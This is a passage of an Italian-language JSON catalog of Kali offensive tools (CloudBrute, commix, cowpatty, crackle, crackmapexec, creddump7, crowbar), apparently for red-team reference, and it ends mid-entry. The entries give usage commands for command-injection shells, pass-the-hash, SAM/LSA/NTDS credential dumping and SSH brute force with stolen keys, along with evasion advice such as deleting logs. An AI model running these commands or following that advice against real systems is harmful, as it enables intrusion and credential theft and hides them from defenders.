    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>CloudBrute</strong> e uno strumento scritto in Go progettato per la discovery di risorse cloud attraverso tecniche di brute force su nomi di bucket, container e storage. Sfruttando il parallelismo nativo delle goroutine di Go, CloudBrute raggiunge velocita di enumerazione notevolmente superiori rispetto alle alternative scritte in Python, testando migliaia di combinazioni di nomi al secondo su piu provider cloud contemporaneamente. Lo strumento supporta nativamente AWS S3, Azure Blob Storage, Google Cloud Platform e DigitalOcean Spaces, coprendo i principali ecosistemi cloud enterprise. Include wordlist ottimizzate basate su pattern comuni nel naming di risorse cloud come backup, logs, dev, staging, prod e varianti con il nome dell'organizzazione target. CloudBrute e particolarmente efficace nella fase iniziale di ricognizione quando si vuole mappare la superficie di attacco cloud di un'organizzazione.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Enumerazione Multi-Provider ad Alta Velocita:</strong> Grazie all'architettura in Go con goroutine, CloudBrute puo testare simultaneamente migliaia di nomi di risorse su AWS, Azure, GCP e DigitalOcean. Il sistema di concorrenza e configurabile per bilanciare velocita e consumo di risorse, permettendo di adattare lo scan alle esigenze operative e alla banda disponibile.</p><p><strong>Wordlist Intelligenti e Keyword-Based:</strong> Lo strumento genera automaticamente permutazioni basate su keyword fornite dall'utente (nome azienda, progetto, dominio) combinate con suffissi e prefissi comuni nel cloud naming. Questo approccio e piu efficace delle wordlist generiche perche riflette i pattern reali usati dagli amministratori cloud nella denominazione delle risorse di storage.</p><p><strong>Rilevamento di Misconfigurazioni di Accesso:</strong> Per ogni risorsa scoperta, CloudBrute verifica le permission di accesso identificando bucket pubblicamente leggibili, listabili o scrivibili. Distingue tra risorse esistenti ma protette e risorse con configurazioni di accesso permissive, fornendo una classificazione immediata della gravita dei finding per il report finale.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>CloudBrute si utilizza specificando il dominio target e una keyword che viene combinata con la wordlist integrata per generare candidati. Lo strumento accetta anche wordlist personalizzate per scenari piu mirati.</p><pre><code># Enumerazione base con keyword aziendale\ncloudbrute -d target.com -k targetcorp -w wordlist.txt\n\n# Scan limitato ad AWS con output su file\ncloudbrute -d target.com -k target -p aws -o results.txt\n\n# Scan multi-provider con thread personalizzati\ncloudbrute -d target.com -k target -w custom_words.txt -t 100\n\n# Enumerazione focalizzata su Azure\ncloudbrute -d target.com -k target -p azure -o azure_results.txt</code></pre><p>I risultati includono URL delle risorse scoperte, stato di accessibilita e provider di appartenenza. E consigliabile eseguire lo strumento con wordlist personalizzate basate su ricognizione OSINT preliminare sul target per massimizzare i risultati.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In operazioni di <strong>Cloud Security Assessment</strong>, CloudBrute rappresenta lo strumento ideale per la fase iniziale di discovery quando si vuole mappare rapidamente tutte le risorse di storage esposte di un'organizzazione su piu provider cloud. La velocita in Go lo rende preferibile a cloud_enum per scan su larga scala con molti target. In contesti di <strong>Bug Bounty</strong>, la scoperta di bucket S3 o Azure Blob Storage mal configurati e una delle finding piu comuni e remunerative, e CloudBrute automatizza questa ricerca in modo efficiente. Per <strong>Red Team Operations</strong>, l'enumerazione delle risorse cloud puo rivelare backup di database, file di configurazione, chiavi API e altri dati sensibili esposti involontariamente, fornendo potenziali vettori di accesso iniziale senza interazione diretta con l'infrastruttura del target.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'elevato volume di richieste HTTP verso i servizi cloud (API S3, Azure, GCP) puo generare alert di rate limiting e, in alcuni casi, notifiche di security ai proprietari delle risorse enumerate. I provider cloud monitorano i pattern di enumerazione e possono bloccare temporaneamente gli IP sorgente che generano troppe richieste 404 o 403.</p><p><strong>Impatto operativo:</strong> Lo strumento genera traffico significativo verso i servizi cloud pubblici. L'IP sorgente sara visibile nei log dei provider cloud e potrebbe essere correlato ad attivita di ricognizione. In caso di scan aggressivi, i provider possono applicare throttling o ban temporanei che compromettono l'efficacia dell'enumerazione.</p><p><strong>Mitigazioni:</strong> Distribuire le richieste nel tempo riducendo il numero di thread concorrenti. Utilizzare proxy rotanti o VPN per distribuire il traffico su piu IP sorgente. Eseguire lo scan in sessioni separate per provider diverso. Combinare con OSINT passivo (Certificate Transparency, DNS records) per ridurre il numero di tentativi brute force necessari e focalizzare lo scan su candidati piu probabili.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence",
      "Cloud_Enum"
    ],
    "notes": null
  },
  {
    "id": "commix",
    "name": "commix",
    "version": "4.0",
    "icon": "../app/icons/commix-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/commix/",
    "desc": "Automatizza test e sfruttamento di command injection su applicazioni web.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Commix</strong> (Command Injection Exploiter) e uno strumento automatizzato e open-source specializzato nella detection e nello sfruttamento di vulnerabilita di OS command injection nelle applicazioni web. Sviluppato in Python, Commix testa sistematicamente diversi vettori e tecniche di injection, dalla classic injection basata su metacaratteri shell fino alle sofisticate varianti time-based blind e file-based. Lo strumento supporta sia richieste GET che POST, gestisce cookie e header personalizzati, e puo operare attraverso proxy per integrarsi con Burp Suite o altri intercepting proxy. Una volta identificata una vulnerabilita di command injection, Commix puo stabilire una pseudo-shell interattiva che permette di eseguire comandi direttamente sul sistema target, oppure generare reverse shell complete per il post-exploitation. La sua versatilita lo rende l'equivalente di SQLmap per le vulnerabilita di command injection.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Tecniche di Injection Multiple:</strong> Commix implementa diverse tecniche di injection organizzate in categorie: results-based (classic, eval-based, dynamic code evaluation) e blind-based (time-based, file-based). Per ogni tecnica, utilizza vettori specifici con diversi metacaratteri shell (;, |, ||, &&, backtick, $()) e encoding per massimizzare la probabilita di successo anche in presenza di filtri parziali sull'input.</p><p><strong>Shell Interattiva e Reverse Shell:</strong> Dopo aver confermato l'esistenza della vulnerabilita, lo strumento offre una pseudo-shell interattiva che permette di eseguire comandi arbitrari sul sistema operativo sottostante. Supporta anche la generazione automatica di reverse shell (Python, Perl, Netcat, Bash) per stabilire una connessione persistente piu affidabile per operazioni di post-exploitation prolungate.</p><p><strong>Bypass di Filtri e WAF:</strong> Commix include moduli di evasione per bypassare filtri di input e Web Application Firewall. Supporta tecniche come tab-encoding, double-encoding, base64 injection, e concatenazione di stringhe per costruire comandi che eludono i controlli di sicurezza. Il parametro --tamper permette di applicare script di trasformazione personalizzati ai payload.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Commix si utilizza puntandolo verso un URL con parametri sospetti di command injection. Il livello di aggressivita e configurabile tramite il parametro --level che controlla il numero di tecniche e vettori testati.</p><pre><code># Test di un parametro GET specifico\ncommix -u \"http://target.com/page.php?cmd=whoami\" --level=3\n\n# Test con dati POST e cookie di sessione\ncommix -u \"http://target.com/exec.php\" --data=\"ip=127.0.0.1\" --cookie=\"PHPSESSID=abc123\"\n\n# Ottenere una pseudo-shell interattiva\ncommix -u \"http://target.com/ping.php?host=localhost\" --os-shell\n\n# Con tecniche di evasione e proxy\ncommix -u \"http://target.com/page.php?cmd=test\" --tamper=base64encode --proxy=http://127.0.0.1:8080\n\n# Specificare la tecnica di injection\ncommix -u \"http://target.com/page.php?cmd=test\" --technique=t</code></pre><p>E consigliabile iniziare con un livello basso e incrementare progressivamente. L'opzione --proxy permette di osservare i payload inviati attraverso Burp Suite per comprensione e documentazione.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel <strong>Web Application Penetration Testing</strong>, Commix e lo strumento di riferimento quando si sospetta command injection in funzionalita che interagiscono con il sistema operativo: form di ping/traceroute, generatori di PDF, convertitori di file, interfacce di gestione server o qualsiasi input che possa essere passato a una shell. In scenari di <strong>Bug Bounty</strong>, permette di identificare rapidamente injection in applicazioni complesse testando automaticamente centinaia di vettori. Per il <strong>Red Team</strong>, una volta ottenuta l'esecuzione di comandi tramite injection, la funzionalita di reverse shell automatica accelera il passaggio dalla vulnerabilita web all'accesso al sistema operativo sottostante, facilitando il lateral movement.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> I payload di command injection contengono metacaratteri shell riconoscibili (pipe, semicolons, backtick, $()) che sono facilmente identificabili da WAF e sistemi IDS. Le tecniche time-based generano ritardi anomali nelle risposte HTTP che possono essere correlati. I tentativi falliti producono errori applicativi che vengono registrati nei log del server.</p><p><strong>Impatto operativo:</strong> Lo strumento genera un volume significativo di richieste con payload malevoli che possono essere facilmente attribuiti a un attacco. L'esecuzione di comandi sul sistema target lascia tracce nei log di sistema, nella process table e potenzialmente nei sistemi SIEM. Le reverse shell stabilite sono connessioni di rete anomale facilmente identificabili.</p><p><strong>Mitigazioni:</strong> Utilizzare proxy per ridurre la velocita delle richieste e mimetizzarsi nel traffico legittimo. Preferire la tecnica time-based con delay minimi per ridurre il footprint. Dopo aver ottenuto la shell, eliminare i log applicativi se possibile. Utilizzare canali di comunicazione criptati per le reverse shell.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "Command_Injection"
    ],
    "notes": null
  },
  {
    "id": "cowpatty",
    "name": "cowpatty",
    "version": "4.8",
    "icon": "../app/icons/cowpatty-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/cowpatty/",
    "desc": "Cracca WPA/WPA2-PSK usando dizionari o rainbow table precomputate.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>coWPAtty</strong> e uno strumento specializzato nel cracking offline di password WPA/WPA2-PSK, progettato specificamente per sfruttare rainbow table precomputate (PMK - Pairwise Master Key) che accelerano drasticamente il processo di cracking rispetto agli attacchi dizionario tradizionali. Mentre strumenti come aircrack-ng calcolano la derivazione della chiave (PBKDF2 con 4096 iterazioni) per ogni password tentata, coWPAtty puo utilizzare tabelle di hash precomputate per uno specifico SSID, riducendo il tempo di cracking da ore a secondi. Lo strumento richiede la cattura preventiva di un handshake WPA a quattro vie (four-way handshake) tra un client e l'access point target. Include anche l'utility genpmk per la generazione di rainbow table personalizzate, permettendo di preparare tabelle ottimizzate per gli SSID specifici dell'ambiente target.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Attacco Dizionario con Calcolo PMK:</strong> Nella modalita tradizionale, coWPAtty prende ogni password dalla wordlist e calcola la Pairwise Master Key tramite PBKDF2-SHA1 con 4096 iterazioni usando l'SSID come salt. Questo processo e computazionalmente costoso ma non richiede preparazione preventiva, rendendolo adatto per test rapidi con wordlist piccole o quando l'SSID e unico.</p><p><strong>Attacco con Rainbow Table Precomputate:</strong> Utilizzando file .cow generati da genpmk, coWPAtty salta completamente il calcolo PBKDF2 e confronta direttamente i PMK precomputati con l'handshake catturato. Questo riduce il tempo di cracking di ordini di grandezza, passando da migliaia di password al secondo a milioni, rendendo feasible l'attacco anche con dizionari molto grandi.</p><p><strong>Generazione Rainbow Table con genpmk:</strong> L'utility companion genpmk permette di generare rainbow table personalizzate per qualsiasi SSID. Le tabelle possono essere generate su hardware potente o GPU farm e poi trasferite su sistemi piu leggeri per il cracking effettivo. Le tabelle sono specifiche per SSID, quindi devono essere rigenerate per ogni rete target con SSID diverso.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Prima di utilizzare coWPAtty e necessario catturare un handshake WPA valido usando strumenti come airodump-ng. L'handshake deve contenere tutti e quattro i messaggi EAPOL tra client e access point.</p><pre><code># Attacco dizionario standard\ncowpatty -r capture.cap -f /usr/share/wordlists/rockyou.txt -s TargetSSID\n\n# Generazione rainbow table per SSID specifico\ngenpmk -f /usr/share/wordlists/rockyou.txt -d rainbow_target.cow -s TargetSSID\n\n# Attacco con rainbow table precomputata\ncowpatty -r capture.cap -d rainbow_target.cow -s TargetSSID\n\n# Verifica che l'handshake sia valido nel file di cattura\ncowpatty -r capture.cap -s TargetSSID -c</code></pre><p>La generazione delle rainbow table puo richiedere tempo significativo per wordlist grandi ma e un investimento che ripaga quando si devono testare piu handshake per lo stesso SSID o quando si ripetono test periodici sulla stessa rete.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In operazioni di <strong>Wireless Penetration Testing</strong>, le rainbow table precomputate sono particolarmente efficaci contro reti con SSID comuni e diffusi (\"linksys\", \"NETGEAR\", \"default\") per i quali sono disponibili tabelle precalcolate online. Per <strong>Enterprise Wireless Auditing</strong>, la generazione di rainbow table personalizzate per l'SSID aziendale permette di verificare rapidamente e periodicamente la robustezza delle password PSK della rete, integrando il testing nel ciclo di audit di sicurezza. In contesti di <strong>Incident Response</strong>, quando si sospetta che la password di una rete wireless sia stata compromessa, coWPAtty permette di verificare rapidamente se la password corrente e presente in wordlist note di credenziali compromesse.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il cracking avviene completamente offline sul file di cattura, quindi non genera traffico di rete aggiuntivo ne interazione con l'access point target. L'unica fase rilevabile e la cattura dell'handshake iniziale, che richiede la deautenticazione di un client o l'attesa di una riconnessione legittima.</p><p><strong>Impatto operativo:</strong> Le rainbow table occupano spazio disco significativo (decine di GB per wordlist complete) e la loro generazione richiede risorse computazionali elevate. Le tabelle sono strettamente legate all'SSID specifico: qualsiasi cambio di SSID invalida completamente le tabelle precomputate, richiedendo una rigenerazione completa.</p><p><strong>Mitigazioni:</strong> Utilizzare tecniche di deautenticazione mirate e a basso volume per catturare l'handshake senza generare anomalie evidenti nel traffico wireless. Conservare le rainbow table in modo sicuro poiche rappresentano un asset operativo riutilizzabile. Verificare sempre la validita dell'handshake prima di investire tempo nel cracking.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Cracking"
    ],
    "notes": null
  },
  {
    "id": "crackle",
    "name": "crackle",
    "version": "0.1~git01282014",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/crackle/",
    "desc": "Cracca pairing BLE (Bluetooth Low Energy) e decripta traffico catturato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Crackle</strong> e uno strumento di sicurezza specializzato nello sfruttamento di una vulnerabilita fondamentale nel processo di pairing Bluetooth Low Energy (BLE) Legacy. Il protocollo BLE Legacy Pairing utilizza una Temporary Key (TK) derivata da un PIN numerico a 6 cifre (range 000000-999999) che puo essere bruteforzata in meno di un secondo, dato lo spazio delle chiavi limitato a un milione di combinazioni. Una volta recuperata la TK, Crackle deriva la Short Term Key (STK) e la Long Term Key (LTK), permettendo di decifrare sia la sessione corrente che tutte le comunicazioni future tra i dispositivi paired. Lo strumento opera su catture pcap contenenti il processo completo di pairing BLE, rendendolo uno strumento essenziale per la valutazione della sicurezza di dispositivi IoT e wearable che utilizzano BLE.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Brute Force della Temporary Key:</strong> Crackle esegue un attacco esaustivo sulla TK a 6 cifre utilizzata nel BLE Legacy Pairing. Con solo un milione di combinazioni possibili e operazioni crittografiche leggere (AES-128), il brute force completa in frazioni di secondo anche su hardware modesto. Lo strumento identifica automaticamente i pacchetti di pairing nella cattura e estrae i parametri necessari per il cracking.</p><p><strong>Derivazione Completa delle Chiavi di Sessione:</strong> Dalla Temporary Key recuperata, Crackle calcola la Short Term Key (STK) usata per cifrare la fase di distribuzione delle chiavi, e successivamente la Long Term Key (LTK) che protegge tutte le comunicazioni successive. Questo permette di decifrare non solo la sessione di pairing ma anche tutto il traffico futuro tra i due dispositivi senza necessita di ulteriori intercettazioni.</p><p><strong>Decrittazione del Traffico BLE Catturato:</strong> Lo strumento prende in input un file pcap contenente traffico BLE cifrato e produce un file pcap con il traffico completamente decrittato. Il traffico decrittato puo essere analizzato con Wireshark per esaminare i protocolli applicativi sovrapposti al BLE, come GATT e ATT, rivelando i dati scambiati tra i dispositivi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>L'utilizzo di Crackle richiede la cattura preventiva del processo completo di pairing BLE tra due dispositivi, inclusi i pacchetti LE Pairing Request, Pairing Response, Pairing Confirm e Pairing Random. La cattura puo essere effettuata con Ubertooth One o altri sniffer BLE.</p><pre><code># Crack automatico da cattura pcap contenente il pairing\ncrackle -i capture_ble.pcap -o decrypted_traffic.pcap\n\n# Specificare la TK se gia nota (es. PIN osservato)\ncrackle -i capture_ble.pcap -o decrypted.pcap -t 000000\n\n# Crack con output verboso per debug\ncrackle -i capture_ble.pcap -o decrypted.pcap -v\n\n# Specificare la LTK se gia nota per decrittare sessioni successive\ncrackle -i session.pcap -o decrypted.pcap -l 0123456789abcdef0123456789abcdef</code></pre><p>Se il pairing utilizza il metodo \"Just Works\" (TK = 0), Crackle decritta istantaneamente senza necessita di brute force. Per il metodo \"Passkey Entry\", il brute force della TK a 6 cifre richiede meno di un secondo.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In valutazioni di <strong>Sicurezza IoT</strong>, Crackle e fondamentale per testare la sicurezza del processo di pairing di dispositivi smart come fitness tracker, smartwatch, serrature elettroniche, dispositivi medicali e sensori industriali che utilizzano BLE Legacy Pairing. La capacita di decifrare il traffico rivela dati sensibili come informazioni sanitarie, codici di accesso o comandi di controllo trasmessi in chiaro dopo la cifratura BLE. Per <strong>Ricerca su Protocolli Proprietari</strong>, dopo aver decrittato il traffico BLE e possibile analizzare protocolli applicativi custom utilizzati da produttori IoT, identificando vulnerabilita aggiuntive nella logica applicativa. In contesti di <strong>Compliance e Audit</strong>, Crackle dimostra concretamente la debolezza del BLE Legacy Pairing, fornendo evidenza tecnica per raccomandare la migrazione a BLE Secure Connections basato su ECDH.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il cracking avviene completamente offline sulla cattura pcap, quindi non genera traffico di rete ne interazione con i dispositivi target. L'unica fase attiva e la cattura del traffico BLE, che richiede uno sniffer dedicato (Ubertooth One) e prossimita fisica ai dispositivi entro il raggio BLE (tipicamente 10-30 metri).</p><p><strong>Impatto operativo:</strong> L'attacco funziona esclusivamente contro BLE Legacy Pairing. I dispositivi che implementano BLE 4.2+ Secure Connections con ECDH non sono vulnerabili a questa tecnica. E necessario catturare il processo di pairing iniziale completo: se i dispositivi sono gia paired, bisogna forzare un re-pairing o attendere che avvenga naturalmente.</p><p><strong>Mitigazioni:</strong> Operare in prossimita fisica discreta dei dispositivi target. Utilizzare antenne direzionali per la cattura BLE per ridurre la necessita di avvicinamento. Documentare le limitazioni dell'attacco nel report, specificando che BLE Secure Connections non e vulnerabile. Verificare la versione BLE dei dispositivi target prima di procedere.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "Bluetooth"
    ],
    "notes": null
  },
  {
    "id": "crackmapexec",
    "name": "crackmapexec",
    "version": "5.4.0",
    "icon": "../app/icons/crackmapexec-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/crackmapexec/",
    "desc": "Post-exploitation tool per reti Windows: SMB, WMI, MSSQL, LDAP, spray, relay.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>CrackMapExec</strong> (CME) è il coltellino svizzero per il post-exploitation in ambienti Windows/Active Directory. Un singolo tool che supporta SMB, WinRM, LDAP, MSSQL, SSH e RDP per enumerazione, password spraying, esecuzione remota e lateral movement. È lo strumento preferito per 'owned one, pwn them all' - partendo da una credenziale, compromettere l'intera rete.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Password Spraying:</strong> Testa credenziali contro molti host simultaneamente identificando dove sono valide.</p><p><strong>Credential Dumping:</strong> Estrae hash SAM, LSA secrets e credenziali cached via SMB/WMI.</p><p><strong>Remote Execution:</strong> Esegue comandi remoti via WMI, SMBExec, PSExec, WinRM senza lasciare file.</p><p><strong>Module System:</strong> Centinaia di moduli per task specifici (Mimikatz, BloodHound collection, GPP passwords).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Password spray evitando lockout (1 password per ciclo)\ncrackmapexec smb targets.txt -u users.txt -p 'Summer2024!' --no-bruteforce --continue-on-success\n\n# Pass-the-hash su intera subnet\ncrackmapexec smb 192.168.1.0/24 -u admin -H 'aad3b435:31d6cfe0d16ae931' --local-auth\n\n# Dump credenziali completo (SAM + LSA + NTDS se DC)\ncrackmapexec smb dc01.domain.local -u admin -p pass --sam --lsa --ntds\n\n# Esecuzione fileless con output\ncrackmapexec smb 192.168.1.10 -u admin -p pass -X 'Get-Process | Select Name,Id'\n\n# Module chaining: enum -&gt; exploit\ncrackmapexec smb 192.168.1.0/24 -u admin -p pass -M spider_plus  # cerca file sensibili\ncrackmapexec smb 192.168.1.0/24 -u admin -p pass -M gpp_password  # GPP creds\ncrackmapexec smb 192.168.1.0/24 -u admin -p pass -M lsassy  # dump remoto\n\n# LDAP per BloodHound collection\ncrackmapexec ldap dc01 -u user -p pass -M bloodhound --collection All\n\n# MSSQL per command execution via xp_cmdshell\ncrackmapexec mssql sql01 -u sa -p 'Password123!' -x 'whoami'\n\n# WinRM per sessione interattiva\ncrackmapexec winrm 192.168.1.10 -u admin -p pass -X '$env:COMPUTERNAME'</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Strumento <strong>essenziale</strong> in ogni AD pentest. Password spraying identifica credenziali riutilizzate. Lateral movement massivo con credenziali compromesse. L'output colorato mostra immediatamente dove le credenziali funzionano (Pwn3d!).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le tecniche sono note e monitorate. Password spray genera login falliti. L'uso dei moduli (Mimikatz) triggera EDR.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Lateral_Movement"
    ],
    "notes": null
  },
  {
    "id": "creddump7",
    "name": "creddump7",
    "version": "0.1",
    "icon": "../app/icons/creddump7-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/creddump7/",
    "desc": "Estrae hash e credenziali cached da registry hive Windows (SAM, SYSTEM).",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Creddump7</strong> e una suite di script Python progettata per l'estrazione offline di credenziali dai file registry di Windows. Lo strumento opera sui file SAM (Security Account Manager), SYSTEM e SECURITY ottenuti da un sistema Windows, estraendo hash NTLM degli account locali, LSA Secrets (password di servizi, credenziali auto-logon, chiavi di cifratura) e Domain Cached Credentials (DCC/MSCache) degli utenti di dominio che hanno effettuato login sul sistema. Creddump7 e la versione aggiornata per Python 3 del progetto originale creddump, mantenendo compatibilita con le strutture registry di Windows fino alle versioni piu recenti. Lo strumento e particolarmente utile in scenari forensi e di post-exploitation dove si dispone di copie dei file registry ma non si ha accesso live al sistema, come nell'analisi di immagini forensi, backup o shadow copies.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Estrazione Hash NTLM (pwdump):</strong> Lo script pwdump.py estrae gli hash NTLM e LM (se presenti) di tutti gli account locali dal file SAM, utilizzando la bootkey dal file SYSTEM per la decifratura. Gli hash estratti sono nel formato compatibile con John the Ripper e Hashcat, pronti per il cracking offline. Questo permette di recuperare le password degli account locali incluso l'account Administrator.</p><p><strong>Domain Cached Credentials (cachedump):</strong> Lo script cachedump.py estrae le credenziali cached (DCC/MSCache) dal file SECURITY per gli utenti di dominio Active Directory che hanno effettuato login sul sistema. Windows memorizza per default le ultime 10 credenziali di dominio per permettere il login quando il domain controller non e raggiungibile. Queste credenziali possono essere craccate offline con strumenti come hashcat (modalita 2100 per DCC2).</p><p><strong>LSA Secrets (lsadump):</strong> Lo script lsadump.py estrae i segreti LSA dal file SECURITY, che possono contenere password di servizi Windows eseguiti come account specifici, credenziali di auto-logon configurate, chiavi di cifratura DPAPI, password di connessioni VPN e altri segreti memorizzati dal sistema operativo per conto di applicazioni e servizi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Creddump7 richiede i file registry di Windows che si trovano in C:\\Windows\\System32\\config\\. Su un sistema live, questi file sono bloccati dal sistema operativo e devono essere copiati tramite shadow copies, backup, o strumenti come reg save. Su immagini forensi, sono direttamente accessibili dopo il mount.</p><pre><code># Estrazione hash NTLM degli account locali\npython3 pwdump.py /mnt/evidence/Windows/System32/config/SYSTEM /mnt/evidence/Windows/System32/config/SAM\n\n# Estrazione Domain Cached Credentials\npython3 cachedump.py /mnt/evidence/Windows/System32/config/SYSTEM /mnt/evidence/Windows/System32/config/SECURITY\n\n# Estrazione LSA Secrets (password servizi, auto-logon, VPN)\npython3 lsadump.py /mnt/evidence/Windows/System32/config/SYSTEM /mnt/evidence/Windows/System32/config/SECURITY\n\n# Su sistema live, prima copiare i registry tramite shadow copy\n# vssadmin create shadow /for=C:\n# copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM .\n# copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM .\n# copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SECURITY .</code></pre><p>Gli hash estratti da pwdump possono essere passati direttamente a hashcat o John the Ripper per il cracking. Le cached credentials DCC2 richiedono la modalita specifica 2100 in hashcat.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In operazioni di <strong>Analisi Forense</strong>, creddump7 e lo strumento standard per estrarre credenziali da immagini forensi di sistemi Windows quando si investiga su compromissioni o accessi non autorizzati. La possibilita di operare offline garantisce che l'evidenza originale non venga alterata. Per il <strong>Post-Exploitation</strong>, quando si ottiene accesso a un sistema Windows e si possono copiare i file registry (tramite shadow copies o privilegi elevati), creddump7 permette di estrarre tutti i tipi di credenziali per il lateral movement verso altri sistemi nella rete. In scenari di <strong>Disaster Recovery e Audit</strong>, lo strumento permette di verificare la complessita delle password degli account locali su sistemi Windows a partire dai backup, identificando account con password deboli o condivise tra piu sistemi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'estrazione avviene offline sui file registry copiati, quindi non genera eventi di security sul sistema target. Tuttavia, la copia dei file registry (SAM, SYSTEM, SECURITY) da un sistema live tramite shadow copy o reg save genera eventi nel log di sicurezza di Windows che possono essere monitorati da SIEM e soluzioni EDR.</p><p><strong>Impatto operativo:</strong> Gli hash NTLM estratti possono essere utilizzati direttamente per attacchi pass-the-hash senza necessita di cracking. Le cached credentials DCC2 sono significativamente piu lente da craccare rispetto agli hash NTLM standard a causa dell'algoritmo PBKDF2 utilizzato. Gli LSA Secrets possono contenere password in chiaro di servizi critici.</p><p><strong>Mitigazioni:</strong> Eseguire l'estrazione su un sistema di analisi separato, non sul sistema target. Utilizzare strumenti alternativi come secretsdump.py (Impacket) su sistema live per ridurre le operazioni sul target. Proteggere gli hash estratti come materiale sensibile. Documentare la catena di custodia quando si opera in contesto forense.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Dumping"
    ],
    "notes": null
  },
  {
    "id": "crowbar",
    "name": "crowbar",
    "version": "4.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/crowbar/",
    "desc": "Brute forcer per SSH, RDP, VNC, OpenVPN che supporta chiavi e password.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Crowbar</strong> (precedentemente noto come Levye) e uno strumento di brute force specializzato nell'attacco a protocolli di autenticazione che altri cracker tradizionali come Hydra o Medusa non supportano adeguatamente. La caratteristica distintiva di Crowbar e il supporto nativo per l'autenticazione basata su chiave SSH, permettendo di testare chiavi private rubate o trovate contro molteplici host per identificare dove sono ancora valide. Inoltre, Crowbar e uno dei pochi strumenti che supporta correttamente il brute force di Remote Desktop Protocol (RDP) con Network Level Authentication (NLA) abilitata, una configurazione sempre piu comune negli ambienti enterprise moderni. Lo strumento supporta anche attacchi a VNC e OpenVPN, completando la copertura dei protocolli di accesso remoto piu diffusi.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>SSH Key Brute Force:</strong> Crowbar puo testare una directory di chiavi private SSH contro singoli host o intere subnet per identificare dove le chiavi sono accettate. Questo e particolarmente utile quando si trovano chiavi SSH su un sistema compromesso e si vuole determinare rapidamente a quali altri sistemi permettono l'accesso. Lo strumento gestisce automaticamente le diverse formati di chiave e i diversi tipi di crittografia.</p><p><strong>RDP con Network Level Authentication:</strong> A differenza di Hydra e Medusa che falliscono silenziosamente contro RDP con NLA abilitata, Crowbar implementa correttamente il protocollo CredSSP/NLA per l'autenticazione. Questo lo rende lo strumento di riferimento per il brute force di servizi Remote Desktop in ambienti Windows enterprise dove NLA e configurata come requisito di sicurezza.</p><p><strong>OpenVPN Credential Testing:</strong> Crowbar puo testare credenziali (username/password) contro server OpenVPN utilizzando file di configurazione .ovpn personalizzati. Questa funzionalita e utile quando si ottengono file di configurazione VPN e si vogliono testare credenziali candidate o wordlist per verificare l'accesso alla rete interna del target.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Crowbar utilizza il flag -b per specificare il protocollo target e supporta sia singoli host che range CIDR. Le credenziali possono essere fornite come singoli valori o come file di lista.</p><pre><code># Brute force SSH con directory di chiavi private\ncrowbar -b sshkey -s 192.168.1.0/24 -u root -k /path/to/stolen_keys/\n\n# Brute force RDP con NLA su singolo host\ncrowbar -b rdp -s 192.168.1.10/32 -u administrator -C passwords.txt\n\n# Brute force RDP con 